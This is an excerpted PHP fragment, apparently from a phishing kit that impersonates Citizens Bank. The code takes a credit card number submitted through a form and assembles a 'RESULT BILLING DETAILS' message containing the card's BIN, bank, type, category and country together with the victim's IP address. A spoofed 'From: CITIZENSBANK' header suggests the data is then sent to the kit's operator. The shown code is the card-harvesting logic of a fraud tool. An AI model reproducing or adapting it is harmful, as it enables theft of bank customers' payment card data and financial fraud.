...
function getBrowser()
{
  ...
  function defineNUM($bin) {
      return str_replace(' ', '', stripslashes($_POST["cc"]));
...
$message .= "+ ------------------------------------------ + \n";
$message .= "+ 🔓 CITIZENSBANK Billing Information | $ip 💎\n";
...
$message .= "| \n";
$message .= "| CC BIN : $bin\n";
$message .= "| CC BANK : $brand\n";
$message .= "| CC TYPE : $cardType\n";
$message .= "| CC CATEGORY : $cardCategory\n";
$message .= "| CC COUNTRY NAME : $countryName\n";
$message .= "| CC COUNTRY CODE : $countryCode\n";
$message .= "+ ------------------------------------------ + \n";
...
$subject="RESULT BILLING DETAILS | $ip ";
$from= "From: CITIZENSBANK";
